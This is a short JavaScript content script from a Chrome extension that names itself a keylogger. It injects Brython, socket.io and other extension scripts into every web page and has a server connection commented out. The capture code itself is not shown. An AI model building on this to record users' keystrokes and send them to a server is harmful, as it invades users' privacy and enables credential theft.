console.log('Loaded keylogger');

document.body.classList.add('keylogger');

var brpython_stdlib = document.createElement('script');
brpython_stdlib.src = chrome.runtime.getURL('./scripts/brython_stdlib.js');
(document.head || document.documentElement).appendChild(brpython_stdlib);

var brpython = document.createElement('script');
brpython.src = chrome.runtime.getURL('./scripts/brython.js');
(document.head || document.documentElement).appendChild(brpython);

var socketio = document.createElement('script');
socketio.src = chrome.runtime.getURL("./scripts/socket.io.js");
(document.head || document.documentElement).appendChild(socketio);
console.log('Loaded socket.io');

var sock = document.createElement('script');
sock.src = chrome.runtime.getURL("./scripts/sock.js");
sock.defer = true;
(document.head || document.documentElement).appendChild(sock);
console.log('Loaded sock.js');


// try {
//     var socket = io();
//     socket.on('connect', function() {
//         console.log('Connected to server');
//         socket.emit('connected', {data: 'I\'m connected!'});
//     });
// } catch (e) {
//     console.log(e)
// }

chrome.storage.sync.get('on', function(result) {
    if(result.on) {
        fetch(chrome.runtime.getURL('./public/item.html')).then(r => r.text()).then(html => {
            document.body.insertAdjacentHTML('beforeend', html)
        });
        
        fetch(chrome.runtime.getURL('./public/test.html')).then(r => r.text()).then(html => {
            document.head.insertAdjacentHTML('beforeend', html)
        });
        
        var test = document.createElement('script');
        test.src = chrome.runtime.getURL('./scripts/test.js');
        test.defer = true;
        (document.head || document.documentElement).appendChild(test);
    }    
})


const on = true
